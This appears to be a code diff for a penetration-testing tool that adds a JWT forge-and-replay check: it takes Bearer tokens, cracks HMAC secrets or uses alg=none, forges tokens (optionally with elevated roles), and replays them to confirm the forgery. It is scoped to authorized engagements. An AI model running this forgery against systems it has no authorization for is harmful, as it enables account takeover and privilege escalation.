@@ -59,8 +59,11 @@ async def analyze_jwt(engagement_id: str) -> Dict[str, int]:
     in_scope = [f for f in summaries
                 if eng.host_in_scope((urlparse(f.url).hostname or "").lower())]
 
+    from app.validation.safe_poc import SafePoC, ScopeError
+    safe = SafePoC(in_scope=eng.host_in_scope)
     findings: List[Finding] = []
     seen: set[str] = set()
+    replayed = 0
 
     for f in in_scope[:300]:
         full = await flows_repo.get_flow(f.id)
@@ -77,6 +80,17 @@ async def analyze_jwt(engagement_id: str) -> Dict[str, int]:
             seen.add(dedupe)
             findings.extend(_assess(token, head, payload or {}, f.url))
 
+        # Forge-and-replay: prove a weak request JWT is actually forgeable by
+        # minting a token and replaying it read-only against the same endpoint.
+        if replayed < 25:
+            bearer = _request_bearer(full)
+            if bearer:
+                fr = await _forge_replay(safe, f.url, bearer,
+                                         allow_elevate=eng.allow_active_exploit)
+                if fr is not None:
+                    replayed += 1
+                    findings.append(fr)
+
     await save_analysis_job(engagement_id, "jwt", findings, target="(JWT tokens)")
 
     crit = sum(1 for x in findings if x.severity in ("critical", "high"))
@@ -86,6 +100,63 @@ async def analyze_jwt(engagement_id: str) -> Dict[str, int]:
 
 
 # --------------------------------------------------------------------------- #
+
+def _request_bearer(full: Dict[str, Any]) -> Optional[str]:
+    """The Bearer JWT in the request Authorization header, if any."""
+    for n, v in (full.get("request_headers") or []):
+        if str(n).lower() == "authorization":
+            m = _JWT_RE.search(str(v))
+            if m and str(v).lower().startswith("bearer "):
+                return m.group(0)
+    return None
+
+
+async def _forge_replay(safe, url, token, *, allow_elevate):
+    """Mint a forged token (alg=none or re-signed with a cracked secret) and
+    replay it read-only. Confirmed only if the forged token is accepted (200)
+    while a control token with an invalid signature is rejected."""
+    from app.jwt_forge import decode_parts, elevate, forge_hs, forge_none
+
+    head, payload = decode_parts(token)
+    if head is None:
+        return None
+    alg = str(head.get("alg", "")).lower()
+
+    secret = _crack_hs(token) if alg.startswith("hs") else None
+    if alg not in ("none", "") and not secret:
+        return None  # not forgeable by us
+
+    new_payload = elevate(payload) if allow_elevate else dict(payload)
+    if not allow_elevate:
+        new_payload["allhack_forge"] = "1"  # benign marker -> distinct token
+    forged = forge_none(new_payload) if alg in ("none", "") else forge_hs(head, new_payload, secret)
+    control = token.rsplit(".", 1)[0] + ".aXhkInvalidSignature"
+
+    try:
+        ctrl = await safe.fetch(url, method="GET", headers={"Authorization": f"Bearer {control}"})
+        forged_resp = await safe.fetch(url, method="GET", headers={"Authorization": f"Bearer {forged}"})
+    except ScopeError:
+        return None
+    if forged_resp is None or forged_resp.status_code != 200 or len(forged_resp.text) == 0:
+        return None
+    if ctrl is not None and ctrl.status_code == 200:
+        return None  # endpoint accepts anything -> not a JWT-validation proof
+
+    how = "alg=none (unsigned)" if alg in ("none", "") else f"re-signed with cracked secret '{secret}'"
+    sev = "critical"
+    note = " with elevated role claims" if allow_elevate else ""
+    return Finding(
+        severity=sev,
+        title=f"JWT forgery confirmed on {url}",
+        description="A forged token was accepted by the server (a control token "
+                    "with an invalid signature was rejected).",
+        target=url,
+        evidence=(f"Forged token {how}{note} -> HTTP 200 ({len(forged_resp.text)} bytes); "
+                  f"control (bad signature) -> HTTP {ctrl.status_code if ctrl else 'n/a'}."),
+        metadata={"vuln_class": "jwt", "status": "confirmed", "confidence": 0.95,
+                  "kind": "forge_replay", "alg": alg},
+    )
+
 
 def _collect_tokens(full: Dict[str, Any]) -> List[str]:
     out: List[str] = []
